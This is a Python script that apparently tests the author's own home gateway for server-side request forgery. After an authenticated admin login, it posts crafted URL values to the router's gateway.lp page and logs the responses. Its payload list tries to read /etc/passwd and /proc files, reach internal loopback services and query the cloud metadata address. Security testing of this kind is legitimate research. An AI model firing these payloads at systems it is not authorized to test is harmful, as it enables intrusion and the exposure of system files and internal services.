#!/usr/bin/env python3
"""POST gateway.lp action=URL with varied urlVal — SSRF / fetch-behavior check.

Normal admin SRP login only. No reboot, import, or firmware actions.
Records status, size, sha256, and safe body markers only (no cookies/secrets).
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import re
import time
import urllib.error
import urllib.parse
from pathlib import Path

from f1_secrets import read_password_file
from f1_srp_login import SRPClient

ROOT = Path(__file__).resolve().parents[1]
BASE = "http://192.168.2.1"
GAP = 2.0


def login_page(body: bytes) -> bool:
    return bool(re.search(rb'id\s*=\s*[\"\']sign-me-in[\"\']', body, re.I))


def csrf_from(html: bytes) -> str:
    m = re.search(rb'CSRFtoken"\s+content\s*=\s*"([^"]+)"', html, re.I)
    if not m:
        raise RuntimeError("CSRF token not found")
    return m.group(1).decode()


def classify_body(body: bytes) -> dict:
    markers = [name for name, pat in (
        ("cups_empty", b"No destinations added"),
        ("cups_word", b"CUPS"),
        ("ipp", b"application/ipp"),
        ("proc_rip", b"/proc/rip"),
        ("wps_device", b"WFADevice"),
        ("passwd", b"root:"),
        ("login_form", b"sign-me-in"),
        ("thenc", b"THENC"),
        ("soap_fault", b"errorCode"),
    ) if pat in body]
    title = None
    m = re.search(rb"<title[^>]*>([^<]{1,80})</title>", body, re.I)
    if m:
        title = m.group(1).decode("utf-8", "replace").strip()
    return {
        "login_page": login_page(body),
        "markers": markers,
        "title": title,
    }


def open_no_raise(client: SRPClient, url: str, data=None, method="GET"):
    try:
        return client._open(url, data, method)
    except urllib.error.HTTPError as err:
        return err.code, err.read()


def post_url(client: SRPClient, csrf: str, url_val: str) -> tuple[int, bytes, float]:
    fields = [
        ("action", "URL"),
        ("urlVal", url_val),
        ("CSRFtoken", csrf),
    ]
    data = urllib.parse.urlencode(fields).encode()
    t0 = time.monotonic()
    code, body = open_no_raise(client, f"{BASE}/gateway.lp", data, "POST")
    elapsed = time.monotonic() - t0
    return code, body, elapsed


def session_login(client: SRPClient, password: str, deadline: float) -> str:
    while time.monotonic() < deadline:
        code, body = open_no_raise(client, f"{BASE}/login.lp")
        if code != 200 or b"CSRFtoken" not in body:
            time.sleep(5)
            continue
        client.csrf = csrf_from(body)
        try:
            code, result = client.login("User", password)
        except urllib.error.HTTPError as err:
            code, result = err.code, err.read()
        if code == 200 and result == "ok":
            code, body = open_no_raise(client, f"{BASE}/gateway.lp")
            if code == 200 and not login_page(body):
                return csrf_from(body)
        time.sleep(5)
    raise SystemExit("could not establish admin session before deadline")


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--password-file", type=Path, required=True)
    parser.add_argument("--wait-minutes", type=float, default=45.0,
                        help="poll login.lp every 60s until HTTP 200")
    args = parser.parse_args()
    password = read_password_file(args.password_file)
    os.umask(0o077)
    out_dir = ROOT / "artifacts" / "ui" / time.strftime("gateway-url-%Y%m%dT%H%M%SZ", time.gmtime())
    out_dir.mkdir(parents=True, exist_ok=False)
    jar = out_dir / "cookies.txt"

    payloads = [
        ("baseline_lan_gateway", f"{BASE}/gateway.lp"),
        ("loopback_80_login", "http://127.0.0.1/login.lp"),
        ("loopback_631_root", "http://127.0.0.1:631/"),
        ("lan_631", f"http://192.168.2.1:631/"),
        ("loopback_49152_wps", "http://127.0.0.1:49152/wps_device.xml"),
        ("file_proc_rip", "file:///proc/rip/0108"),
        ("file_etc_passwd", "file:///etc/passwd"),
        ("empty", ""),
        ("localhost_admin_cups", "http://localhost/admin/"),
        ("at_sign_bypass", "http://User@127.0.0.1:631/"),
        ("metadata_link", "http://169.254.169.254/latest/meta-data/"),
        ("javascript", "javascript:alert(1)"),
    ]

    rows: list[dict] = []
    client = SRPClient(str(jar), BASE)
    deadline = time.monotonic() + args.wait_minutes * 60
    csrf = session_login(client, password, deadline)
    del password
    client.save_jar()

    baseline_hash = None
    for name, url_val in payloads:
        if name != payloads[0][0]:
            time.sleep(GAP)
        code, body, elapsed = post_url(client, csrf, url_val)
        digest = hashlib.sha256(body).hexdigest()
        if baseline_hash is None:
            baseline_hash = digest
        row = {
            "case": name,
            "url_val": url_val,
            "status": code,
            "bytes": len(body),
            "sha256": digest,
            "elapsed_s": round(elapsed, 3),
            "differs_from_baseline": digest != baseline_hash,
            **classify_body(body),
        }
        rows.append(row)
        (out_dir / f"{name}.private").write_bytes(body)
        if code == 503:
            break

    summary = {"baseline_sha256": baseline_hash, "rows": rows}
    (out_dir / "summary.json").write_text(json.dumps(summary, indent=2) + "\n")
    print(json.dumps(summary, indent=2))


if __name__ == "__main__":
    main()
